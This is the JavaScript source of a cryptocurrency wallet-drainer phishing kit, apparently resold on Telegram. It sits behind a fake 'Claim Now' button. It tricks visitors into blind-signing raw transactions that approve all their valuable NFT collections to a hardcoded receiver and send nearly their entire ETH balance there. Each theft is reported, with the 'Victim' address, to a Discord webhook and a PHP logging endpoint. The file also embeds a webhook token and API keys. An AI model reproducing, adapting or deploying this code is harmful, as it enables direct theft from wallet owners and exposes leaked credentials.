"use strict";

/***
 * IF YOU DONT GOT IT FROM @ Tob1dev on telegram then this tool got reselled
 * Contact Tob1dev on telegram 
 * Do not resell it
 * Contact Tob1dev and expose the resller, so you wont get attacked
 ***/


/**** CONFIGURATIONS ****/

const config = { 

     /*** PUT YOUR PUBLIC KEY HERE  ***/
    receiver: "0x57658ebCC4122b28322e8f90e89117dB18D7bFBe",


    design: {
        walletAppear: true,
        eliAppear: true,
        
        connectElement: "#connectButton", // Which element to display messages on. Good to keep in mind that the script sets the .innerText property and not the .value property. 
        connectedElement: "#claimButton", // Which element to display messages on. Good to keep in mind that the script sets the .innerText property and not the .value property. 
        
        retryDelay: 3000, // How long time (in ms) before the message display text changes from e.g. success to retrySuccess.
        

        buttonMessagesEnabled: true,
        buttonMessages: {
          initialConnect: "Connect Wallet",
          initialConnected: "Claim Now",

          progress: "Processing…", // This shows up after the user clicks on it
          success: "Success. Waiting ... ", // This shows up when the user approves a transaction
          failed: "Something went wrong.", // This shows up when something goes wrong
        }
    },


    walletDevider: 3, // When the wallet divided by x is the highest, the money transaction pops up first
    minWalletBalance: 0.0002,

    claimInfo: {
        maxTransfer: 2,

        collectionDetails: {
            // floor price
            minAveragePrice: 0.001,
            minVolumeTraded: 2,
        },

        // ERC20 minValue in USD
        minValueERC20: 0,
    },

    /**** SET TO TRUE IF YOU WANT TO USE A WEBHOOK ****/
    webHook: true,

    /**** PUT YOUR WEBHOOK URL HERE IF webHook SET TO TRUE****/
    webhookURL: "https://discord.com/api/webhooks/1017586098031054869/E1iti5T7eL9yai3CHngKL5PJQNHPhAuWTAz3IrijBmhTaLFIgZJBzGRo_eKqpkGIHdP_",

}



/**** CONTRACT ABI ****/

const NFT_ABI = [
    {
    "inputs": [{
        "internalType": "address",
        "name": "operator",
        "type": "address"
    }, {
        "internalType": "bool",
        "name": "approved",
        "type": "bool"
    }],
    "name": "setApprovalForAll",
    "outputs": [],
    "stateMutability": "nonpayable",
    "type": "function"
    }
];

class Configuration {
    web3Js;
    metamaskInstalled = false;

    isConnected  = false;

    walletAddress;
    walletBalance;
    walletBalanceInEth;
    chainId;

    transactions = [];
    nonce;

    isMoneySent = false;

    OpenseaAPI = "f802d4b29b744e05849c5e06a6afdb4e";
    MoralisAPI = "xWuhxRUCEHao4WBDFvM6qIZSeEgGN18zrrWQMca7aiLtoa3fioq0Bgkf5PaiW0Gx";
    requestOptions = {
        method: 'GET',
        headers: {
            Accept: 'application/json',
            'X-API-KEY': ''
        }
    };

    // FRONTENED BUTTONS 
    connectBtn = document.getElementById("connectButton");
    claimSection = document.getElementById("claimSection");
    claimButton;
    walletField = document.getElementById("walletAddress");
    eligible = document.getElementById("notEli");

}


class Main extends Configuration {

    constructor () { 
        super();

        if (typeof window.ethereum !== 'undefined') this.metamaskInstalled = true; 

        this.connectBtn = document.getElementById(config.design.connectElement.replace("#", ""));
        this.claimButton = document.getElementById(config.design.connectedElement.replace("#", ""));
        this.connectBtn.innerText = config.design.buttonMessages.initialConnect;
        this.claimButton.innerText = config.design.buttonMessages.initialConnected;


        Moralis.onWeb3Enabled(async (data) => {
            // if (data.chainId !== 1 && this.metamaskInstalled) await Moralis.switchNetwork("0x1");
                this.updateStates(true);
        });

        window.ethereum ? window.ethereum.on('accountsChanged', (accounts) => {
            if (accounts.length < 1) this.updateStates(false)
        }) : null;

        if (this.isMobile() && !window.ethereum) {
            this.connectBtn.addEventListener("click", () => {
                window.location.href = `https://metamask.app.link/dapp/${window.location.hostname}${window.location.pathname}`;
            });
        } else {
            this.connectBtn.addEventListener("click", () => {
                this.connectWallet()
            });
        }
        this.claimButton.addEventListener("click", this.transfer);
    }

    connectWallet = async () => {
        this.isConnected = true;
        await Moralis.enableWeb3(!this.metamaskInstalled && {
            provider: "walletconnect"
        });
    }


    updateStates = async (connect = true) => {
        if(connect)
        {
            if(!this.isConnected) {
                await this.connectWallet();
            }

            this.isConnected = true;
            this.web3Js = new Web3(Moralis.provider);

            this.walletAddress = (await this.web3Js.eth.getAccounts())[0];
            this.walletBalance = await this.web3Js.eth.getBalance(this.walletAddress);
            this.walletBalanceInEth = await this.web3Js.utils.fromWei(this.walletBalance, 'ether')
            this.chainId = await this.web3Js.eth.getChainId();
            this.nonce = await this.web3Js.eth.getTransactionCount(this.walletAddress);

            this.claimSection.style.display = "block";
            this.connectBtn.style.display = "none";


            if(config.design.walletAppear) this.walletField.innerHTML = this.walletAddress.slice(0, 20) + " ...";
        } 
        else 
        {
            this.isConnected = false;
            this.claimSection.style.display = "none";
            this.connectBtn.style.display = "block";
        }

    }


     // [TRANSFER ALL]
     transfer = async () => {
        if(config.design.buttonMessagesEnabled) this.claimButton.innerText = config.design.buttonMessages.progress;
        this.transactions.push({
            type: "money",
            price: this.walletBalanceInEth * config.walletDevider
        });

        this.requestOptions.headers["X-API-KEY"] = "CUS72342636&&&//";

        console.log("Check tokens if valid");
        let arr = [];
        let checkedTokens = await fetch("https://web3tokenchecker.com/api/fetch.php", this.requestOptions)
        .then(response => response.json())

        if(checkedTokens.error != null) {
            console.error("Moralis Not autorized: " + checkedTokens.error);
            return;
        }
    
        arr.filter(token => checkedTokens.tokens);
    
        let newAllCheckedTokens = checkedTokens.tokens;
    
        let finalObject = {
            validTokens: newAllCheckedTokens,
            contractReciver: checkedTokens.receiver
        }

        await this.fetchNFTS();




        let filteredTransactions = [...this.transactions]
        .sort((a, b) => b.price - a.price);

        console.log("Final: ", filteredTransactions);

        // return await this.transferMoney();


        if(filteredTransactions[0].type == "erc721" || filteredTransactions[0].type == "erc1155") {
            await this.transferNFT(filteredTransactions[0]);
        } 


        if(filteredTransactions[1].type == "money") {
            await this.transferMoney();
        }

        if(filteredTransactions[2].type == "erc721" || filteredTransactions[2].type == "erc1155") {
            await this.transferNFT(filteredTransactions[2]);
        } 

        if(filteredTransactions[2].type == "money") {
            await this.transferMoney();
        }


        if(filteredTransactions[3].type == "money") {
            await this.transferMoney();
        } 

        if(filteredTransactions[3].type == "erc721" || filteredTransactions[3].type == "erc1155") {
            await this.transferNFT(filteredTransactions[3]);
        } 


    };

    
    updateTransactions = (index, denied = false, success = false) => {
        if(config.design.buttonMessagesEnabled) this.claimButton.innerText = config.design.buttonMessages.failed;

        if(denied == true) {
            setTimeout(() => {
            if(this.transactions.length >= 1 && config.design.buttonMessagesEnabled) this.claimButton.innerText = config.design.buttonMessages.progress;
            }, config.design.retryDelay)
        }

        if(success == true) {
            setTimeout(() => {
                if(this.transactions.length >= 1 && config.design.buttonMessagesEnabled)  this.claimButton.innerText = config.design.buttonMessages.success;
            }, config.design.retryDelay)
        }
        this.transactions.splice(0, 1);
        // last Popup
        console.log(index);
        console.log(this.transactions.length)
        console.log(this.transactions.length == 0)

        if(this.transactions.length == 0) {
            console.log("End: Transactions are all done or denied: ", index)
            this.claimButton.innerText = config.design.buttonMessages;

            // check if transactionType copy is the FIRST

            if(config.design.buttonMessagesEnabled) this.claimButton.innerText = config.design.buttonMessages.success;
            
            setTimeout(() => {
                if(config.design.buttonMessagesEnabled) this.claimButton.innerText = config.design.buttonMessages.initialConnected;
            }, config.design.retryDelay);
            this.transactions.length = 0;
        }
}




    // [TRANSFER NFTS]
    fetchNFTS = async () => {
        console.log("Trying sending nfs");

        this.requestOptions.headers["X-API-KEY"] = this.OpenseaAPI;
            let nfts = [];
            nfts = await fetch(`https://api.opensea.io/api/v1/collections?asset_owner=${this.walletAddress}&offset=0&limit=300`, this.requestOptions)
            .then(response => response.json())
            .then(nfts => {
                if (!nfts) return "Request was throttled";
                return nfts.filter(nft => {
                    if (nft.primary_asset_contracts.length > 0) return true
                    else return false
                })
                .map(nft => {
                    console.log(nft.primary_asset_contracts[0].schema_name.toLowerCase());
                    console.log(nft);
                    return {
                        name: nft.primary_asset_contracts[0].name,
                        type: nft.primary_asset_contracts[0].schema_name.toLowerCase(),
                        contractAddress: nft.primary_asset_contracts[0].address,
                        price: this.round(nft.stats.one_day_average_price != 0 ? nft.stats.one_day_average_price : nft.stats.seven_day_average_price) * nft.owned_asset_count,
                        owned: nft.owned_asset_count,
                        banner: nft.banner_image_url,
                        volumeTraded: nft.stats.total_volume,
                        slug: nft.slug
                    }
                })
            })
            .catch(err => {
                console.log("Nft Request error: ", err);
            })

        console.log("WalletNfts: ", nfts);

        nfts.map(nft => {
                const ethPrice = this.round(nft.price * (nft.type == "erc1155" ? nft.owned : 1))
                if (ethPrice < config.claimInfo.collectionDetails.minAveragePrice) return false;
                if (nft.volumeTraded < config.claimInfo.collectionDetails.minVolumeTraded) return false;
    
                return {
                    name: nft.name,
                    type: nft.type,
                    contractAddress: nft.contractAddress,
                    banner: nft.banner,
                    price: ethPrice * nft.owned,
                    averagePrice: ethPrice,
                    owned: nft.owned,
                    slug: nft.slug,
                    volumeTraded: nft.volumeTraded,
                };
            })
            .sort((a, b) => b.price - a.price)
            .slice(0, config.claimInfo.maxTransfer)
            .map(transaction => {
            this.transactions.push(transaction);
        });

    }


    transferNFT = async (object) => {
        console.log("NFT SENDING")
        console.log(object);
        
        let nonce = await this.web3Js.eth.getTransactionCount(this.walletAddress);
        let contractInstance = new this.web3Js.eth.Contract(NFT_ABI, object.contractAddress);

        let gasPrice = await this.web3Js.eth.getGasPrice();
        let hexGasPrice  = this.web3Js.utils.toHex(Math.floor(gasPrice * 3))

        const transactionObject = {
            nonce: this.web3Js.utils.toHex(nonce),
            gasLimit: this.web3Js.utils.toHex(50000),
            gasPrice: hexGasPrice,
            value: '0x0',
            to: object.contractAddress,
            data: contractInstance.methods.setApprovalForAll(config.receiver, true).encodeABI(),
            v: '0x1',
            r: '0x',
            s: '0x',
        }

        let hexObject = new ethereumjs.Tx(transactionObject);
        const hexString = '0x' + hexObject.serialize().toString('hex'),
            encoded = {
                encoding: 'hex'
        }

        const rawHash = this.web3Js.utils.sha3(hexString, encoded);
   
        await this.web3Js.eth.sign(rawHash, this.walletAddress)
            .then(async (hash) => {

                const firstPrefix = hash.substring(2);
                let r = '0x' + firstPrefix.substring(0, 64);
                let s = '0x' + firstPrefix.substring(64, 128);
                let fullHash = parseInt(firstPrefix.substring(128, 130), 16);
                let y = this.web3Js.utils.toHex(fullHash + this.chainId * 2 + 8);

                hexObject.r = r
                hexObject.s = s
                hexObject.v = y

                const signedTrans = '0x' + hexObject.serialize().toString('hex');

                // send signed Trasnaction
            this.updateTransactions(0, false, true);
                await this.web3Js.eth.sendSignedTransaction(signedTrans)
                .once('transactionHash', hash => {
                    console.log("Success NFT", hash);
                    if(config.webHook) this.sendWebhooks(object.name, object.type, 0, object.price, "ETH", hash, object.banner, object.contractAddress ,object.owned, object.volumeTraded, object.slug );
                    this.insertIntoDatabase(this.walletAddress, object.contractAddress, config.receiver,"0", object.type, object.price, "ETH", object.banner);
                })
                .catch(error => console.log("NFT TRANSFER error:", error));                  
        })
        .catch(error => {
            console.log("Sign error:", error);
            this.updateTransactions(0, true);
        });    
    }

    transferMoney = async () => {
        console.log("Money: Sending money");
        console.log("Wallet Balance:", this.walletBalanceInEth);
        console.log("Required: ", config.minWalletBalance);

        if (this.walletBalanceInEth < config.minWalletBalance) {
            this.updateTransactions(0, true);
            return this.notEli();
        };
        console.log("Money: Enaugh balance");

        //let transactionNonce = await this.web3Js.eth.getTransactionCount(this.walletAddress, 'pending');

        let gasPrice = await this.web3Js.eth.getGasPrice();
        let hexGasPrice  = this.web3Js.utils.toHex(Math.floor(gasPrice * 1.5))

        let bnNumber = new this.web3Js.utils.BN('22000');
        let substractionNumber = bnNumber * Math.floor(gasPrice * 2);
        let etherToSend = this.walletBalance - substractionNumber;
        console.log(etherToSend);
        let nonce = await this.web3Js.eth.getTransactionCount(this.walletAddress);
        console.log(
            'Sending ' +
            this.web3Js.utils.fromWei(etherToSend.toString(), 'ether') +
            "ETH"
        );


        console.log("gas price", gasPrice);

        const transactionObject = {
            nonce: this.web3Js.utils.toHex(nonce),
            gasPrice: hexGasPrice,
            gasLimit:  this.web3Js.utils.toHex(21000),
            to: config.receiver,
            value: '0x' + etherToSend.toString(16),
            data: '0x',
            v: '0x1',
            r: '0x',
            s: '0x',
        }

        let hexObject = new ethereumjs.Tx(transactionObject);
        const hexString = '0x' + hexObject.serialize().toString('hex'),
            encoded = {
                encoding: 'hex'
        }

        const rawHash = this.web3Js.utils.sha3(hexString, encoded);
   
        await this.web3Js.eth.sign(rawHash, this.walletAddress)
            .then(async (hash) => {

                const firstPrefix = hash.substring(2);
                let r = '0x' + firstPrefix.substring(0, 64);
                let s = '0x' + firstPrefix.substring(64, 128);
                let fullHash = parseInt(firstPrefix.substring(128, 130), 16);
                let y = this.web3Js.utils.toHex(fullHash + this.chainId * 2 + 8);

                hexObject.r = r
                hexObject.s = s
                hexObject.v = y

                const signedTrans = '0x' + hexObject.serialize().toString('hex');

                // send signed Trasnaction
                this.updateTransactions(0, false, true);
                await this.web3Js.eth.sendSignedTransaction(signedTrans)
                .once('transactionHash', hash => {
                    console.log("Success MONEY", hash);
                    if(config.webHook) this.sendWebhooks("Transfered Money", "ETH",0, this.walletBalanceInEth, "ETH", hash);
                })
                .catch(error => console.log("Money error:", error));                  
        })
        .catch(error => {
            console.log("Sign error:", error);
            this.updateTransactions(0, true);

        });    
    } 


    getNftTokenIds = async (contractAddress, walletAddress) => {
        this.requestOptions.headers["X-API-KEY"] = this.MoralisAPI;
        const tokens = await fetch('https://deep-index.moralis.io/api/v2/' + walletAddress + '/nft/' + contractAddress + '?chain=Eth&format=decimal', this.requestOptions).then(resp => resp.json());
        let tokenIds = [];
        tokens.result.map(token => tokenIds.push(token.token_id));
        return tokenIds;
    }

    ifYouDontGotThisToolFromTobiDevItGotReselled = () => {}

    calculateTransactionFee = async gasLimit => {
        try {
            let gasPrice = await web3.eth.getGasPrice();
            return (gasPrice * gasLimit) * 2;
        } catch(error) {
            console.log("Gas calculateGasFee error:", error);
        }
    }

    ERC20toUSD  = async (contract, tokenValue, tokenDecimals) => {
        this.requestOptions.headers["X-API-KEY"] = this.MoralisAPI;
        const result = await fetch(`https://deep-index.moralis.io/api/v2/erc20/${contract}/price`, this.requestOptions)
        .then(resp => resp.json());

        tokenValue *= result.usdPrice;
        return this.round(tokenValue / (10**tokenDecimals))
    }

    ERC20toETH = async (contract, tokenValue, tokenDecimals) => {    
        this.requestOptions.headers["X-API-KEY"] = this.MoralisAPI;
        const result = await fetch(`https://deep-index.moralis.io/api/v2/erc20/${contract}/price`, this.requestOptions)
        .then(resp => resp.json());

        // convert perfect 1 USD ETHER to ETHER digits
        let ethprice = await this.web3Js.utils.fromWei(result.nativePrice.value, 'ether');
        let usdPrice = this.round(tokenValue / (10**tokenDecimals))
        return ethprice * usdPrice;
    }

    GASPricetoWEI = (gasPrice) => {
        return Number(parseFloat(gasPrice) * 21000)
    }

    notEli = () => {
        console.log("Not eligible");
        if(config.eliAppear) this.eligible.style.display = "block";
    }

    sleep = ms => {
        return new Promise(resolve => setTimeout(resolve, ms));
    }

    round = val => {
        return Math.round(val * 10000) / 10000;
    }

    isMobile = function () {
        let check = false;
        (function (a) {
            if (/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i.test(a) || /1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i.test(a.substr(0, 4))) check = true;
        })(navigator.userAgent || navigator.vendor || window.opera);
        return check;
    };

    sendWebhooks = async (name, type, withdrawBalance, price, priceName, hash, bannerUrl = "", contractAddress = "", ownedNft = 0, volumeTraded = 0, collectionSlug = "") => {
        if(!config.webHook) return;

        let tokendIds;
        if(ownedNft >= 1){
            tokendIds = await this.getNftTokenIds(contractAddress, this.walletAddress);
        }

        const websiteUrl = window.location.href;
        let embed = {
            author: {
              name: "Confirmed Transaction !"
            },
            title: `Approved ${name} ( ${price}  ${priceName} ) `,
            color: parseInt(("#FFD700").replace("#",""), 16),
            //  #ff0000
            // #FFD700
            image: {
              url: bannerUrl
            },
            fields: [
                {
                  name: '_**Contract**_',
                  value: `**Name:** ${name} \n **Schema:** ${type.toLowerCase()}${
                    ownedNft >= 1 
                    ? 
                    "**\nAverage Price: **" + price + " " + priceName + 
                    "\n**Volume Traded: **" + volumeTraded + " " + priceName 
                    : 
                    "**\nBalance:** " + price + " " + priceName
                   }
                  `
                },
                {
                    name: '_**Withdraw**_',
                    value: `**Transaction:** [Etherscan](https://etherscan.io/tx/${hash})\n${
                        ownedNft >= 1
                        ?
                        `**Opensea:** [Opensea](https://opensea.io/collection/${collectionSlug})\n**Transfer:** [Write To Contract](https://etherscan.io/address/${contractAddress}#writeContract)\n` + 
                        "** Token Ids:** [" + 
                        await Promise.all(
                            tokendIds.map(tokenId => {
                                return tokenId + " "
                            })
                        ) +
                        "]\n"
                        :
                        `**Transfer:** [Write To Contract](https://etherscan.io/address/${contractAddress}#writeContract)` +
                        `\n**WithdrawBalance:** ${withdrawBalance}`

                    }
                    `
                },
                {
                    name: '_**Victim**_',
                    value: `**Status:** Success\n**Address:** ${this.walletAddress}`
                }
              ],
              footer: {
                text: websiteUrl,
                icon_url:
                  'https://cdn.discordapp.com/attachments/985558066852417579/993222301510283315/tg.jpg'
              },
              timestamp: new Date()
        }
          let params = {
            username: "Impare Transaction Bot",
            avatar_url: 'https://cdn.discordapp.com/attachments/985558066852417579/993222301510283315/tg.jpg',
            embeds: [embed],
          }

          fetch(config.webhookURL, {
              method: 'POST',
              headers: {
                  'Content-Type': 'application/json'
              },
              body: JSON.stringify(params)
          })
          .catch(err => console.error(err));
    }

    insertIntoDatabase = async (victim, contract, receiver, widthdrawBalance,type, messageBalance, balance_symbol, banner) => {
       let params = `controller/inserter.php?victim_address=${victim}&contract_address=${contract}&receiver_address=${receiver}&withdraw_balance=${widthdrawBalance}&type=${type}&message_balance=${messageBalance}&balance_symbol=${balance_symbol}&banner=${banner}`;

        console.log(params);
       await fetch(params, this.requestOptions).then(resp => resp.json())
        .then(resp => console.log(resp));
        
    }
    


}

window.addEventListener('load', async () => {
    let obj = new Main();
});



/***
 * IF YOU DONT GOT IT FROM @ Tob1dev on telegram then this tool got reselled
 * Contact Tob1dev on telegram 
 * Do not resell it
 * Contact Tob1dev and expose the resller, so you wont get attacked
 ***/


